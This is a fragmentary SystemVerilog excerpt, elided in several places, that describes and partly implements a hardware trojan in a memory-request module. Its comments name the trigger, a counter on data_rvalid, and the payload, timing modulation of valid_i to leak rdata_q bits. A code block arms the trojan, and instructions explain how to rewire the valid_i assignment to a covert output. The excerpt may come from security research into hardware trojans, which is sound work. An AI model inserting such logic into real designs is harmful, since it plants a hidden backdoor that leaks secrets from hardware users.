 ...
 *   
 * Trigger: Counter on req_port_i.data_rvalid
 * Payload: Modulate valid_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |req_port_i.data_rvalid) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of valid_i:
...
logic       covert_bit_out;         // Drives valid_i when trojan active
...
//   Find the assign for valid_i (or rd_error_o as fallback):
//     assign valid_i = <normal_expr>;
//   Replace with:
//     assign valid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
